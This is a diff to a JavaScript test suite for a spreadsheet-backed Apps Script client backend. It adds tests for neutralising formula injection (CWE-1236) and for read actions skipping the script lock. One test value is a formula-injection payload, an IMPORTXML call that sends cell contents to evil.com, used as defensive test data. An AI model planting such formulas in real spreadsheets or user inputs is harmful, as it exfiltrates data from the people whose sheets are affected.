@@ -103,9 +103,10 @@ class MockSpreadsheet {
   }
 }
 
-function createBackend() {
+function createBackend(options = {}) {
   const spreadsheet = new MockSpreadsheet();
-  let locked = false;
+  let locked = Boolean(options.locked);
+  let lockCallCount = 0;
   const context = {
     console,
     Date,
@@ -121,14 +122,17 @@ function createBackend() {
       getScriptProperties: () => ({ getProperty: (key) => key === 'AUTH_TOKEN' ? 'test-token' : null }),
     },
     LockService: {
-      getScriptLock: () => ({
-        tryLock: () => {
-          if (locked) return false;
-          locked = true;
-          return true;
-        },
-        releaseLock: () => { locked = false; },
-      }),
+      getScriptLock: () => {
+        lockCallCount++;
+        return {
+          tryLock: () => {
+            if (locked) return false;
+            locked = true;
+            return true;
+          },
+          releaseLock: () => { locked = false; },
+        };
+      },
     },
     SpreadsheetApp: { getActiveSpreadsheet: () => spreadsheet },
     ContentService: {
@@ -151,6 +155,8 @@ function createBackend() {
   vm.runInNewContext(source, context, { filename: 'Code.gs' });
   return {
     spreadsheet,
+    setLocked(val) { locked = val; },
+    getLockCallCount() { return lockCallCount; },
     request(action, payload = {}, token = 'test-token') {
       const result = context.doPost({ postData: { contents: JSON.stringify({ token, action, payload }) } });
       return JSON.parse(result.text);
@@ -499,4 +505,61 @@ test('rechaza la creación y actualización de categorías con nombres duplicado
   // Renombrar conservando el mismo nombre
   const updateSame = backend.request('updateCategory', { id: cat2.data.id, name: 'Consultoría' });
   assert.equal(updateSame.success, true);
+});
+
+test('seguridad CWE-1236: neutraliza inyección de fórmulas al escribir y desanitiza al leer', () => {
+  const backend = createBackend();
+  const evilName = '=SUM(1,2)';
+  const evilPhone = '+57 320 1234567';
+  const evilNotes = '=IMPORTXML("https://evil.com/leak?data=" & A1, "//a")';
+
+  const res = backend.request('createClient', {
+    name: evilName,
+    phone: evilPhone,
+    notes: evilNotes,
+    request_id: 'cli_sec_cwe1236'
+  });
+
+  assert.equal(res.success, true);
+  assert.equal(res.data.name, evilName);
+  assert.equal(res.data.phone, evilPhone);
+  assert.equal(res.data.notes, evilNotes);
+
+  // Verificar que en el almacenamiento físico de Sheets esté neutralizado con apóstrofe
+  const clientSheet = backend.spreadsheet.sheets.get('Clientes');
+  assert.ok(clientSheet);
+  const rawRow = clientSheet.rows[1]; // Fila 1 (después de cabeceras)
+  assert.equal(rawRow[1], "'" + evilName);
+  assert.equal(rawRow[2], "'" + evilPhone);
+  assert.equal(rawRow[4], "'" + evilNotes);
+
+  // Verificar que al consultar el listado getClients se devuelva el texto limpio sin apóstrofe
+  const listRes = backend.request('getClients');
+  assert.equal(listRes.success, true);
+  const found = listRes.data.find(c => c.id === res.data.id);
+  assert.ok(found);
+  assert.equal(found.name, evilName);
+  assert.equal(found.phone, evilPhone);
+  assert.equal(found.notes, evilNotes);
+});
+
+test('concurrencia: acciones de solo lectura no adquieren LockService y ejecutan en paralelo', () => {
+  const backend = createBackend();
+
+  // 1. Acciones de lectura no llaman a LockService
+  const pingRes = backend.request('ping');
+  assert.equal(pingRes.success, true);
+  const clientsRes = backend.request('getClients');
+  assert.equal(clientsRes.success, true);
+  assert.equal(backend.getLockCallCount(), 0);
+
+  // 2. Si el lock estuviera tomado por un proceso de escritura externo, las lecturas siguen respondiendo
+  backend.setLocked(true);
+  const readWhileLocked = backend.request('getClients');
+  assert.equal(readWhileLocked.success, true);
+
+  // 3. Pero una acción mutativa sí intenta adquirir lock y falla con CONCURRENCY_TIMEOUT
+  const writeWhileLocked = backend.request('createCategory', { name: 'Nueva Categoria' });
+  assert.equal(writeWhileLocked.success, false);
+  assert.equal(writeWhileLocked.error.code, 'CONCURRENCY_TIMEOUT');
 });
